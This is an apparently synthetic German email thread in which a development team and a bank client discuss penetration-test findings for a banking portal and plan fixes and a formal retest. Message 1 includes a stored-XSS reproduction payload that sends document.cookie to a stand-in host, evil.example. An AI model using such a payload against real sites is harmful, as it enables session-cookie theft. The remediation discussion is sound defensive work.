---
thread_id: email_thread_011
subject: "FinSecure – Penetration Test Ergebnisse"
---

## Message 1

**From:** Tobias Fischer <t.fischer@techvision-gmbh.de>
**To:** Sandra Hoffmann <s.hoffmann@techvision-gmbh.de>, Felix Braun <f.braun@techvision-gmbh.de>, Thomas Krueger <t.krueger@techvision-gmbh.de>, Lisa Weber <l.weber@techvision-gmbh.de>
**Date:** 2025-11-20 09:12 CET

Hallo zusammen,

der Penetration Test durch SecuAudit GmbH (der von Dr. Berger empfohlene Dienstleister) ist abgeschlossen. Ich habe den vollstaendigen Report erhalten und hier die Executive Summary fuer euch:

**Gesamtbewertung: 7.2/10 (Gut)**
Getestet wurde das FinSecure Portal in der Staging-Umgebung (v0.9.3-rc2) ueber einen Zeitraum von 5 Werktagen.

---

**HIGH Severity – 1 Finding:**

**[H-01] Stored XSS in Kommentarfeld des Secure Messaging Moduls**
- **CVSS Score:** 8.1
- **Beschreibung:** Ein authentifizierter User kann im Nachrichten-Kommentarfeld JavaScript-Code einschleusen, der beim Oeffnen der Nachricht durch andere User (inkl. Bankberater) ausgefuehrt wird. Der Angreifer koennte Session Tokens stehlen, Transaktionen im Namen des Opfers ausfuehren oder das UI manipulieren (z.B. gefaelschte Ueberweisungsformulare einblenden).
- **Reproduktion:** `<img src=x onerror="fetch('https://evil.example/steal?cookie='+document.cookie)">` im Nachrichtentext eingeben. Wird beim Empfaenger ungefiltert gerendert.
- **Bewertung:** In einem Banking-Portal ist das ein **kritisches** Finding. Stored XSS mit Session Hijacking in einer Finanzanwendung waere fuer die BaFin ein meldepflichtiger Vorfall.

---

**MEDIUM Severity – 2 Findings:**

**[M-01] Fehlende Rate Limiting auf dem Login-Endpoint**
- **CVSS Score:** 5.3
- **Beschreibung:** Der `/api/v1/auth/login` Endpoint hat kein Rate Limiting. Ein Angreifer koennte Brute-Force-Angriffe auf Kundenkennungen durchfuehren. Die 2FA schuetzt zwar vor erfolgreichem Login, aber das Konto koennte durch wiederholte Fehlversuche gesperrt werden (Account Lockout als DoS-Vektor).
- **Empfehlung:** Rate Limiting (max. 5 Versuche/Minute pro IP und Username), CAPTCHA nach 3 Fehlversuchen, progressive Delays.

**[M-02] Verbose Error Messages in der API**
- **CVSS Score:** 4.3
- **Beschreibung:** Bei bestimmten Fehlerzustaenden gibt die API Stack Traces und interne Informationen zurueck (Spring Boot Default Error Handler). Beispiel: Bei einem ungueltigem Account-Format wird der vollstaendige Java Stack Trace inklusive Classnames und Package-Struktur exponiert.
- **Empfehlung:** Custom Error Handler implementieren, der nur generische Fehlermeldungen zurueckgibt. Details nur im internen Log.

---

**Was bedeutet das fuer unsere Timeline?**

Gemaess unserer Security Policy und dem Vertrag mit FinSecure duerfen wir mit einem offenen HIGH-Finding **nicht in Produktion gehen**. Die Medium Findings muessen vor dem Go-Live adressiert sein, blockieren aber nicht das Deployment.

Felix, ich brauche von dir einen Fix-Plan fuer H-01 mit geschaetztem Aufwand. Die beiden Medium Findings sollten im normalen Sprint abgearbeitet werden koennen.

Der vollstaendige Pentest-Report (48 Seiten, PDF) liegt im SharePoint unter `/Projects/FinSecure/Security/PentestReport_v093_SecuAudit.pdf`. **Achtung: Vertraulich – nur fuer das Projektteam und den Kunden bestimmt.**

Gruesse,
Tobias

## Message 2

**From:** Felix Braun <f.braun@techvision-gmbh.de>
**To:** Tobias Fischer <t.fischer@techvision-gmbh.de>, Sandra Hoffmann <s.hoffmann@techvision-gmbh.de>, Thomas Krueger <t.krueger@techvision-gmbh.de>, Lisa Weber <l.weber@techvision-gmbh.de>, Daniel Wolff <d.wolff@techvision-gmbh.de>
**Date:** 2025-11-20 14:48 CET

Tobias,

danke fuer den ausfuehrlichen Report. Ich habe mir H-01 sofort angeschaut und kann die Root Cause bestaetigen:

**Root Cause Analyse – H-01 (Stored XSS):**
Das Secure Messaging Modul verwendet auf der Backend-Seite `@RequestBody String messageContent` ohne jegliche Input-Sanitization. Im Frontend wird der Inhalt dann mit `dangerouslySetInnerHTML` gerendert, um Rich-Text-Formatierung (Bold, Links, etc.) zu ermoeglichen. Das ist die klassische XSS-Luecke: unsanitized input + raw HTML rendering.

**Proposed Fix (mehrstufig):**

1. **Input Sanitization (Backend):** Wir implementieren serverseitig einen HTML-Sanitizer basierend auf OWASP Java HTML Sanitizer. Erlaubte Tags werden auf eine Whitelist beschraenkt: `<b>`, `<i>`, `<a>` (nur mit `href`-Attribut und `https://`-Schema), `<ul>`, `<ol>`, `<li>`, `<p>`, `<br>`. Alles andere wird gestripped. Event-Handler-Attribute (`onerror`, `onclick` etc.) werden kategorisch entfernt.

2. **Output Encoding (Frontend):** Daniel, wir muessen `dangerouslySetInnerHTML` durch eine sichere Alternative ersetzen. Ich schlage `DOMPurify` als zusaetzliche Client-Side-Sanitization vor, plus die Migration zu einer Markdown-basierten Loesung (z.B. `react-markdown`) fuer Rich Text. Das eliminiert die Notwendigkeit von raw HTML komplett.

3. **Content Security Policy (CSP) Headers:** Ich werde strikte CSP-Headers implementieren:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.finsecure-portal.de
   ```
   Das blockiert Inline-Scripts und External-Script-Loading, selbst wenn ein XSS-Vektor unsere Sanitization umgeht. Defense in Depth.

4. **Zusaetzlich:** HTTP-Only und Secure Flags auf allen Session Cookies (ist eigentlich Standard, habe aber nochmal verifiziert, dass es korrekt gesetzt ist).

**Aufwandsschaetzung:**
- Backend Sanitization: 0.5 Tage
- Frontend Refactoring (dangerouslySetInnerHTML -> react-markdown + DOMPurify): 1.5 Tage (Daniel)
- CSP Header Implementation + Testing: 0.5 Tage
- Regression Testing des Messaging Moduls: 1 Tag
- **Gesamt: ca. 3.5 Tage**

Fuer M-01 (Rate Limiting): Wir verwenden Spring Boot's `bucket4j` Library. Konfiguration fuer den Login-Endpoint: 5 Requests/Minute pro IP, 3 Requests/Minute pro Username. CAPTCHA-Integration nach 3 Fehlversuchen via hCaptcha. Schaetzung: 1 Tag.

Fuer M-02 (Verbose Errors): Custom `@ControllerAdvice` ErrorHandler, der in Production nur generische Messages zurueckgibt. Haben wir als Template in unserer Spring Boot Baseline. Schaetzung: 0.5 Tage.

Ich kann morgen mit dem Fix starten. Daniel, bist du ab morgen frei fuer das Frontend-Refactoring?

Gruesse,
Felix

## Message 3

**From:** Tobias Fischer <t.fischer@techvision-gmbh.de>
**To:** Felix Braun <f.braun@techvision-gmbh.de>, Sandra Hoffmann <s.hoffmann@techvision-gmbh.de>, Thomas Krueger <t.krueger@techvision-gmbh.de>, Lisa Weber <l.weber@techvision-gmbh.de>
**Date:** 2025-11-21 08:30 CET

Felix, exzellente Analyse und ein solider Fix-Plan. Die mehrstufige Approach (Sanitization + CSP + Cookie Hardening) entspricht genau dem Defense-in-Depth-Prinzip, das unsere Security Policy vorschreibt. Ich habe ein paar Ergaenzungen:

**Zur CSP Policy:**
Bitte auch `frame-ancestors 'none'` hinzufuegen, um Clickjacking zu verhindern. Und `base-uri 'self'`, um Base Tag Injection zu blockieren. Ausserdem wuerde ich `upgrade-insecure-requests` empfehlen.

**Zum Testing:**
Ich werde nach dem Fix einen manuellen Re-Check der XSS-Vektoren durchfuehren, bevor wir den formalen Retest bei SecuAudit beauftragen. Das spart uns eine Iteration, falls wir einen Edge Case uebersehen haben. Ich habe eine Liste mit 50+ XSS-Payloads (OWASP XSS Filter Evasion Cheat Sheet), die ich gegen die gefixte Version laufen lassen werde.

**Wichtig – Formaler Prozess:**
Gemaess unserem Vertrag mit FinSecure Bank und unserer Security Policy benoetigen wir **vor dem Production Deployment** folgendes:

1. Nachweis, dass alle HIGH Findings behoben sind (interner Re-Check + externer Retest durch SecuAudit)
2. Schriftliche Freigabe ("Sign-Off") durch Dr. Claudia Berger als Auftraggeberin
3. Updated Risk Assessment mit Restrisiken der Medium Findings (falls diese zum Zeitpunkt des Deployments noch offen sind)

Thomas, bitte leite den Pentest-Report und Felix' Fix-Plan an Dr. Berger weiter. Sie muss informiert werden und die Freigabe erteilen. Ich empfehle ein kurzes Call mit ihr, um die Findings zu erklaeren – ein 48-seitiger Pentest-Report ohne Kontext koennte fuer Verunsicherung sorgen.

Lisa, bitte die 3.5 Tage fuer den Fix plus 2 Tage fuer Retest in den Sprint einplanen. Der Retest durch SecuAudit braucht erfahrungsgemaess 3-5 Werktage Vorlauf fuer die Terminbuchung.

Gruesse,
Tobias

## Message 4

**From:** Dr. Claudia Berger <c.berger@finsecure-bank.de>
**To:** Tobias Fischer <t.fischer@techvision-gmbh.de>, Thomas Krueger <t.krueger@techvision-gmbh.de>, Sandra Hoffmann <s.hoffmann@techvision-gmbh.de>
**Date:** 2025-11-22 11:20 CET

Sehr geehrter Herr Fischer, sehr geehrte Frau Hoffmann,

vielen Dank fuer die transparente Kommunikation bezueglich der Penetration-Test-Ergebnisse. Herr Krueger hat mich gestern ausfuehrlich gebrieft.

Zunaechst: Ich schaetze es sehr, dass Sie proaktiv und detailliert mit den Findings umgehen. Das ist genau die Art von Zusammenarbeit, die wir uns wuenschen. In der Vergangenheit hatten wir Dienstleister, die versucht haben, solche Findings zu relativieren – Ihr Ansatz ist vorbildlich.

Zu den Ergebnissen im Einzelnen:

**H-01 (Stored XSS):** Ich stimme zu, dass dies ein kritisches Finding ist. Die vorgeschlagene mehrstufige Behebung (Sanitization + CSP Headers + Cookie Hardening) klingt fachlich solide. Bitte setzen Sie die Fixes um und beauftragen Sie den Retest bei SecuAudit. Unsere interne IT-Sicherheitsabteilung moechte den Retest-Report ebenfalls einsehen, bevor wir die Freigabe erteilen. Ich habe meinen Kollegen Herrn Markus Stein (IT-Sicherheitsbeauftragter) in CC gesetzt – er wird den technischen Review auf unserer Seite uebernehmen.

**M-01 und M-02:** Auch diese Findings muessen vor dem Go-Live behoben sein. Insbesondere das Rate Limiting ist fuer uns ein Muss – wir hatten in der Vergangenheit Brute-Force-Angriffe auf unser Online-Banking, und ich moechte nicht, dass sich das beim neuen Portal wiederholt.

**Bezueglich der Freigabe:** Ich werde den formalen Sign-Off erteilen, sobald folgende Bedingungen erfuellt sind:
1. Retest durch SecuAudit bestaetigt, dass alle HIGH und MEDIUM Findings behoben sind
2. Herr Stein hat den Retest-Report geprueft und freigegeben
3. Sie liefern uns ein aktualisiertes Sicherheitskonzept mit den implementierten Massnahmen

Bitte planen Sie fuer den Retest-Report und unseren internen Review insgesamt 2 Wochen ein. Ich moechte sicherstellen, dass wir hier keinen Zeitdruck aufbauen, der zu Abkuerzungen fuehrt. Die BaFin-Pruefung im Q2 2026 wird das Portal definitiv unter die Lupe nehmen, und ich moechte, dass wir lueckenlos dokumentieren koennen.

Herr Krueger, bitte passen Sie die Timeline entsprechend an und informieren Sie mich, falls die 2 Wochen den Go-Live-Termin gefaehrden.

Mit freundlichen Gruessen,
Dr. Claudia Berger
Abteilungsleiterin Digitale Kanaele
FinSecure Bank AG
